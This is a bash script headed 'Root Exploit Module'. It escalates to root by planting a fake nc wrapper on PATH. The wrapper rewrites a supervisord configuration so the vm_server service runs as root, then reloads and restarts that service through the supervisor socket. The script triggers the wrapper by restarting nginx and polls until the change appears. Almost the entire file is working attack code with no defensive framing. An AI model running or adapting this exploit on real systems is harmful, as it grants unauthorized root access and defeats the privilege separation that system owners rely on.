#!/bin/bash
# ==========================================
# Root Exploit Module (v4 - Speed Optimized)
# Method: nc wrapper + nginx restart
# Optimized for maximum speed
# ==========================================

# Check if config is loaded
if [ -z "$WORK_DIR" ]; then
    echo "[ERROR] Config not loaded. Source config.sh first."
    return 1 2>/dev/null || exit 1
fi

# Deploy nc wrapper - minimal version for speed
deploy_nc_wrapper() {
    mkdir -p "$(dirname "$NC_WRAPPER_PATH")"
    
    cat > "$NC_WRAPPER_PATH" << 'NC_EOF'
#!/bin/bash
sed -i 's/^user=user$/user=root/g' /opt/gem/supervisord/supervisord.go_vm_server.conf
sed -i 's/USER="user"/USER="root"/g' /opt/gem/supervisord/supervisord.go_vm_server.conf
supervisorctl -s unix:///run/supervisor.sock reread >/dev/null 2>&1
supervisorctl -s unix:///run/supervisor.sock update >/dev/null 2>&1
supervisorctl -s unix:///run/supervisor.sock restart vm_server >/dev/null 2>&1
exec /usr/bin/nc "$@"
NC_EOF
    
    chmod +x "$NC_WRAPPER_PATH"
}

# Trigger exploit - direct supervisorctl, fastest method
trigger_exploit() {
    supervisorctl -s "$SUPERVISOR_SOCK" restart "$NGINX_SERVICE" >/dev/null 2>&1
}

# Wait for exploit - faster polling
wait_for_exploit() {
    local max_wait=45
    local interval=3
    local elapsed=0
    
    while [ $elapsed -lt $max_wait ]; do
        sleep $interval
        elapsed=$((elapsed + interval))
        
        # Check if config was modified (wrapper ran)
        if grep -q '^user=root' "$VM_SERVER_CONF" 2>/dev/null; then
            sleep 5
            return 0
        fi
    done
    
    return 1
}

# Main auto-root function - streamlined
auto_root() {
    if [ "$(id -u)" = "0" ]; then
        log_ok "Already root"
        return 0
    fi
    
    log_info "Deploying exploit..."
    
    # Deploy wrapper
    deploy_nc_wrapper
    export PATH="$(dirname "$NC_WRAPPER_PATH"):$PATH"
    
    # Trigger immediately
    trigger_exploit
    
    # Wait and verify
    wait_for_exploit
    
    echo ""
    echo "Exploit triggered. Wait 30-45s, then run script again."
    echo ""
    return 0
}

# Run if executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    source "$SCRIPT_DIR/config.sh"
    source "$SCRIPT_DIR/utils.sh"
    auto_root
fi
